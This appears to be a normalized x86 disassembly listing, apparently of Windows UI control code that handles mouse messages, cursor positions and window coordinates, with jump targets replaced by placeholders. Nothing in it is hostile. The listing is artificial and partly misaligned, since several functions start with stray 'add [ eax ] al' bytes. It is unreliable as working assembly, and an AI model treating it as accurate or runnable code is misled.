push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_40338c
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_40338c
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_40338c
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_40338c
jmp r-xdata
sub_44de8c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416e0c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_44e374
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_44d11c
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_44d130
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_416e5c
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44e06c
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_44cca4
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_40338c
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_453a88
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44a8a0
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_44e057
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_453a88
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_453a88
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403190
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44cb2c
test esi esi
je r-xdata
sub_44e06c
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_40338c
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_44eef0
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_40338c
mov eax esi
call sub_44cbd4
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_44cb90
mov ecx eax
xor edx edx
xor eax eax
call sub_416e34
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_40338c
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_44e110
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_44e140
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_44e1ac
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_44e26c
sub_44e1dc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_44e20c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_44ccd0
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44e238
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_44e26c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_44e340
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44e374
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_44e40c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_464518
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_464518
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_44cd2c
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_46dcc4
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_40338c
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_46445c
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_40338c
jmp r-xdata
sub_44e5a0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_4088b0
mov edi eax
mov eax [ esi + 0x64 ]
call sub_4088dc
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_44cd2c
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408708
call sub_4086a4
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_4086a4
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_44e648
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_44e678
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_44e63c
push ebp
call sub_44e648
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44e6c8
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_44e754
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_44e78c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_44e20c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_4643cc
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_40338c
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4643cc
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_40338c
sub_44e810
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_44ccfc
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44d3c4
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_44e78c
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_44e85c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_44ccfc
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_44e878
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_44ccfc
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44d3c4
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44e78c
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_40338c
sub_44e8d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_44e1ac
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_44e140
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_44e1ac
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_44e96c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44e78c
pop esi
pop ebx
retn
sub_44e991
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44e78c
pop esi
pop ebx
retn
sub_44e9b7
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44e78c
pop esi
pop ebx
retn
sub_44e9e1
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44e78c
pop esi
pop ebx
retn
sub_44ea0c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_44ea3c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_44e20c
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_4643cc
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_40338c
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4643cc
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_40338c
sub_44eab4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_44eaec
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4643cc
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_40338c
sub_44eb24
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_44d3c4
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44eaec
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406b00
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40338c
sub_44eb9c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44eaec
pop esi
pop ebx
retn
sub_44ebbc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44eaec
pop esi
pop ebx
retn
sub_44ebdc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_4643cc
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_40338c
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_458444
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44ec34
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44d3b4
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_44d3c4
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_44e340
pop esi
retn
sub_44ec74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_44e374
sub_44ed22
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_44d5d4
mov cl 0x1
sub_44ed64
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_44d32c
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_44d32c
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_44ed94
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_44edb8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406b00
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_40338c
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
